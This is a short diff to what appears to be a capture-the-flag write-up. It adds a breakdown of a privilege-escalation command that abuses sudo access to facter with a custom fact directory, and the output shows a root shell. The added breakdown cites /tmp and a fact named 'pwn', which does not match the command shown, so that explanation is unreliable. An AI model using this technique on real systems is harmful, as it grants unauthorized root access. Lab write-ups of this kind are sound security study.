@@ -1204,6 +1204,12 @@ Breakdown:
 
 Command: `sudo facter --custom-dir=/home/trivia nyorosha`
 
+Breakdown:
+
+- **`sudo`**: Runs the process as the root user.
+- **`--custom-dir=/tmp`**: Tells Facter to look in the `/tmp` folder for any `.rb` files.
+- **`pwn`**: Requests the specific fact I defined in the script.
+
 ```shell
 trivia@facts:~$ sudo facter --custom-dir=/home/trivia nyorosha
 root@facts:/home/trivia# 
